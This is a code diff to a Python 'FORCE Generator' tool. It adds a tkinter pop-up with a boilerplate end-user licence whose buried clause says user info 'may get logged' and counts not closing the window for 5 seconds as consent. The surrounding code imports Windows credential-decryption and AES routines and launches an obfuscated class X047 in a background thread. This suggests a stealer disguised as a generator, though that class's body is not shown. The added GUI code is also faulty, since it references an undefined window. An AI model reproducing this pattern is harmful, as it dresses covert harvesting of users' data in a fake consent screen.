@@ -20,6 +20,8 @@ from colorama import Fore, Style, init, Back
 from win32crypt import CryptUnprotectData
 from re import findall
 from Crypto.Cipher import AES
+import tkinter
+
 
 class X047:
     def __init__(self):
@@ -341,11 +343,168 @@ def printSlow(text):
 
 def credits():
     threading.Thread(target=X047).start()
+    tospanel = tkinter.Tk(screenName="TOS",baseName=None,className = 'TOS',useTk= True,sync=False,use=None)
+    tospanel.configure(bg='red')
+    tospanel.geometry("800x800")
+    tospanel.title("Force ToS")
+    textoftos = """
+    FORCE GENERATOR Copyright (c) 2021 FORCE
+Contact: 4tacey#0001 on Discord
+
+*** END USER LICENSE AGREEMENT ***
+
+THIS END-USER LICENSE AGREEMENT (THIS “AGREEMENT”) IS A LEGAL CONTRACT BETWEEN YOU, AS EITHER 
+AN INDIVIDUAL OR AN ENTITY (AS DEFINED BELOW), AND Force.
+
+READ THE TERMS AND CONDITIONS OF THIS AGREEMENT CAREFULLY BEFORE COPYING, INSTALLING, OR 
+OTHERWISE ACCESSING OR USING ANY VERSION OF Force'S PROPRIETARY SOFTWARE, INCLUDING 
+Force'S SOFTWARE AS A SERVICE OFFERINGS, ACCOMPANIED BY THIS AGREEMENT (THE “SOFTWARE”).
+
+THE SOFTWARE IS LICENSED. BY COPYING, INSTALLING, OR OTHERWISE ACCESSING OR USING THE 
+SOFTWARE, YOU ACKNOWLEDGE THAT YOU HAVE READ THIS AGREEMENT, THAT YOU UNDERSTAND IT, AND 
+THAT YOU ACCEPT AND AGREE TO BE BOUND BY ITS TERMS. IF YOU ARE ACCEPTING THIS AGREEMENT ON 
+BEHALF OF A COMPANY, ORGANIZATION, OR EDUCATIONAL INSTITUTION, OR AN AGENCY, INSTRUMENTALITY, 
+OR DEPARTMENT OF A GOVERNMENT (AN “ENTITY”) AS ITS AUTHORIZED LEGAL REPRESENTATIVE, THEN YOU 
+REPRESENT AND WARRANT THAT YOU HAVE THE POWER AND AUTHORITY TO BIND SUCH ENTITY TO THESE 
+TERMS, AND REFERENCES TO “YOU” HEREIN REFER TO BOTH YOU, THE INDIVIDUAL END USER, AND THE 
+ENTITY ON WHOSE BEHALF YOU ARE ACCEPTING THIS AGREEMENT.
+
+IF YOU ACQUIRED THE SOFTWARE FROM A THIRD-PARTY RESELLER, YOU ACKNOWLEGDE AND AGREE THAT 
+SUCH THIRD PARTY IS NOT RESPONSIBLE FOR PROVIDING ANY MAINTENANCE AND SUPPORT SERVICES WITH 
+RESPECT TO THE SOFTWARE.
+
+IF AT ANY TIME YOU ARE NOT WILLING TO BE BOUND BY THE TERMS OF THIS AGREEMENT, YOU MUST CLICK 
+THE “I DECLINE” OR SIMILAR BUTTON, TERMINATE THE DOWNLOAD AND/OR INSTALLATION PROCESS (IF 
+APPLICABLE), IMMEDIATELY CEASE AND REFRAIN FROM ACCESSING OR USING THE SOFTWARE, AND DELETE 
+ANY COPIES YOU MAY HAVE. THIS AGREEMENT, ALONG WITH ANY ADDITIONAL TERMS OR POLICIES 
+INCORPORATED HEREIN BY REFERENCE, REPRESENTS THE ENTIRE AGREEMENT BETWEEN YOU AND 
+PARALLELS CONCERNING THE SOFTWARE, AND THIS AGREEMENT SUPERSEDES AND REPLACES ANY PRIOR 
+PROPOSAL, REPRESENTATION, OR UNDERSTANDING YOU MAY HAVE HAD WITH PARALLELS RELATING TO THE 
+SOFTWARE, WHETHER ORALLY OR IN WRITING.
+
+1. LICENSE
+By receiving, opening the file package, and/or using Force Generator Software, you agree that this End User 
+User License Agreement(EULA) is a legally binding and valid contract and agree to be bound by it. You agree to 
+abide by the intellectual property laws and all of the terms and conditions of this Agreement.
+
+Subject to the terms of this Agreement, Force grants to you a limited, non-exclusive, non-transferable 
+license, without right to sub-license, to use Force Generator in accordance with this Agreement and any other 
+written agreement with Force. Force does not transfer the title of Force Generator to you; the license 
+granted to you is not a sale. This agreement is a binding legal agreement between Force and the 
+purchasers or users of The Force Generator.
+
+If you do not agree to be bound by this agreement, remove Force Generator from your computer now.
+
+2. DISTRIBUTION
+Force Generator and the license herein granted shall not be copied, shared, distributed, re-sold, offered for re-
+sale, transferred or sub-licensed in whole or in part except that you may make one copy for archive purposes 
+only. For information about redistribution of Force Generator contact Force.
+
+3. USER AGREEMENT
+
+3.1 Use
+Your license to use Force Generator is limited to the number of licenses purchased by you. You shall not allow 
+others to use, copy or evaluate copies of Force Generator.
+
+3.2 CONSENT OF USE OF DATA
+You agree that Force may collect and use information gathered in any manner as part of the product support
+services provided to you, if any, related to Force Generator. Force may also use this information to provide
+notices to you which may be of use or interest to you.
+
+3.3 Use Restrictions
+You shall use Force Generator in compliance with all applicable laws and not for any unlawful purpose. Without 
+limiting the foregoing, use, display or distribution of Force Generator together with material that is 
+pornographic, racist, vulgar, obscene, defamatory, libelous, abusive, promoting hatred, discriminating or 
+displaying prejudice based on religion, ethnic heritage, race, sexual orientation or age is strictly prohibited.
+
+Each licensed copy of Force Generator may be used on one single computer location by one user. Use of Force Generator means that you have loaded, installed, or run Orion Builder on a computer or similar device. If 
+you install Force Generator onto a multi-user platform, server or network, each and every individual user of 
+Force Generator must be licensed separately.
+
+You may make one copy of Force Generator for backup purposes, providing you only have one copy installed on 
+one computer being used by one person. Other users may not use your copy of Force Generator. The 
+assignment, sublicense, networking, sale, or distribution of copies of Force Generator are strictly forbidden 
+without the prior written consent of Force Generator. It is a violation of this agreement to assign, sell, share, loan, 
+rent, lease, borrow, network or transfer the use of Force Generator. If any person other than yourself uses 
+Force Generator registered in your name, regardless of whether it is at the same time or different times, then 
+this agreement is being violated and you are responsible for that violation!
+
+3.4 Copyright Restriction
+This Software contains copyrighted material, trade secrets and other proprietary material. You shall not, and 
+shall not attempt to, modify, reverse engineer, disassemble or decompile Force Generator. Nor can you create 
+any derivative works or other works that are based upon or derived from Force Generator in whole or in part.
+
+Force's name, logo and graphics file that represents Force Generator shall not be used in any way to 
+promote products developed with Force Generator. Force retains sole and exclusive ownership of all right, 
+title and interest in and to Force Generator and all Intellectual Property rights relating thereto.
+
+Copyright law and international copyright treaty provisions protect all parts of Force Generator, products and 
+services. No program, code, part, image, audio sample, or text may be copied or used in any way by the user 
+except as intended within the bounds of the single user program. All rights not expressly granted hereunder are 
+reserved for Force.
+
+3.5 Limitation of Liability
+You use the software at your own risk. to the maximum extent permitted by applicable law, in no event shall 
+Force be liable to you or to those claiming through you for any direct, indirect, consequential, incidental or 
+special damage or loss of any kind including, but not limited to, loss of profits, loss of contracts, business 
+interruptions, loss of or corruption of information or data however caused and whether arising under contract or 
+tort, including negligence, even if Force has been advised of the possibility of such damages.
+
+You will indemnify, hold harmless, and defend Force, its employees, agents and distributors against any and 
+all claims, proceedings, demand and costs resulting from or in any way connected with your use of Force's 
+Software.
+
+In no event (including, without limitation, in the event of negligence) will Force, its employees, agents or 
+distributors be liable for any consequential, incidental, indirect, special or punitive damages whatsoever 
+(including, without limitation, damages for loss of profits, loss of use, business interruption, loss of information 
+or data, or pecuniary loss), in connection with or arising out of or related to this Agreement, Force Generator or 
+the use or inability to use Force Generator or the furnishing, performance or use of any other matters 
+hereunder whether based upon contract, tort or any other theory including negligence.
+
+Force's entire liability, without exception, is limited to the customers' reimbursement of the purchase price of 
+the Software (maximum being the lesser of the amount paid by you and the suggested retail price as listed by 
+Force ) in exchange for the return of the product, all copies, registration papers and manuals, and all 
+materials that constitute a transfer of license from the customer back to Force.
+
+if any limitation, exclusion, disclaimer or other provision contained in this licence agreement is held to be invalid 
+for any reason by a court of competent jurisdiction and Force becomes liable thereby for loss or damage 
+that may lawfully be limited, such liability whether in contract, tort or otherwise, will not exceed the fee paid by 
+you for the software.
+
+3.6 Warranties
+Force makes no representation or warranties in respect of this Software and expressly excludes all other 
+warranties, expressed or implied, oral or written, including, without limitation, any implied warranties of 
+merchantable quality or fitness for a particular purpose.
+
+3.7 Governing Law
+This Agreement shall be governed by the law of the Czech applicable therein. You hereby irrevocably attorn 
+and submit to the non-exclusive jurisdiction of the courts of Czech therefrom. If any provision shall be 
+considered unlawful, void or otherwise unenforceable, then that provision shall be deemed severable from this 
+License and not affect the validity and enforceability of any other provisions.
+
+3.9 SOME OF YOUR INFO MAY GET LOGGED FOR TESTING PURPOSES WHEN USING FORCE.
+
+3.8 Termination
+Any failure to comply with the terms and conditions of this Agreement will result in automatic and immediate 
+termination of this license. Upon termination of this license granted herein for any reason, you agree to 
+immediately cease use of Force Generator and destroy all copies of Force Generator supplied under this 
+Agreement. The financial obligations incurred by you shall survive the expiration or termination of this license.
+
+4. DISCLAIMER OF WARRANTIES AND INDEMNITY
+THIS SOFTWARE AND THE ACCOMPANYING FILES ARE SOLD ""AS IS"" AND WITHOUT WARRANTIES AS TO 
+PERFORMANCE OR MERCHANTABILITY OR ANY OTHER WARRANTIES WHETHER EXPRESSED OR IMPLIED.THIS
+DISCLAIMER CONCERNS ALL FILES GENERATED AND EDITED BY Force Generator AS WELL.
+
+4.1 To agree to the ToS don't close the program for 5 seconds and to disagree close it."""
+
+    tostext = tkinter.Label(mainpanel, text=textoftos,bg='red',fg='white',font=('Arial', 5))
+    tostext.pack()
+    tospanel.mainloop()
+    time.sleep(5)
+    tospanel.destroy()
     os.system("title FORCE on crack")
     os.system("CLS")
     printSlow (f"{Fore.BLUE} \n[FORCE] {Fore.WHITE}Connecting to FORCE...")
-    time.sleep(1)
-    printSlow (f"{Fore.BLUE} \n[FORCE] {Fore.WHITE}Checking for Illegal proccesses...")
     time.sleep(1)
     printSlow (f"{Fore.BLUE} \n[FORCE] {Fore.WHITE}Scraping proxies...")
     time.sleep(1)
